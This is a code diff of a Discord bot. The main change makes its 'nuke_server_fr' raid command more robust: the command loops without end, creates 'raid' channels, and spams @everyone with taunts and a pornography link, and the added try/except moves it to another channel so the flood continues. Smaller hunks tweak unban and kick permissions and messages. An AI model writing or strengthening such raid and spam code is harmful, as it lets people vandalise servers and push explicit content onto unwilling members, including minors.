@@ -403,7 +403,8 @@ async def nuke_server_fr(ctx):
                 await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
 
             while True:
-                await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
+                try:
+                    await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
 EZ
 EZ
 EZ
@@ -411,7 +412,9 @@ EZ
 EZ
 EZ
 http://pornhub.com/**""")
-            
+                except:
+                    newchannel = random.choice(ctx.guild.text_channels)
+                    
                 try:
                     await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                     await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
@@ -495,7 +498,7 @@ async def ban(self, member: discord.Member, *, reason=None):
 
 
 @bot.command(name='unban', help='Unbans a user.')
-@commands.has_permissions(administrator=True)
+@commands.has_permissions(ban_members=True)
 async def unban(self, *, member):
     banned_users = await self.guild.bans()
     found = 0
@@ -505,7 +508,7 @@ async def unban(self, *, member):
         user = ban_entry.user
         if (user.name, user.discriminator) == (member_name, member_discriminator):
             await self.guild.unban(user)
-            await self.send(f'`{user} has been unbanned`')
+            await self.send(f"""`{user}` has been unbanned""")
             found = 1
             break
     if found == 0:
@@ -516,7 +519,8 @@ async def unban(self, *, member):
 @commands.has_permissions(kick_members=True)
 async def kick(self, *, member: discord.Member, reason=None):
     await member.kick(reason=reason)
-    await self.send(f'User `{member}` has been kicked')
+    await self.send(f"""User `{member}` has been kicked"
+Reason: {reason}""")
 
 
 @bot.command(name='spam', help="""Spams a certain message a certain number of times.""")
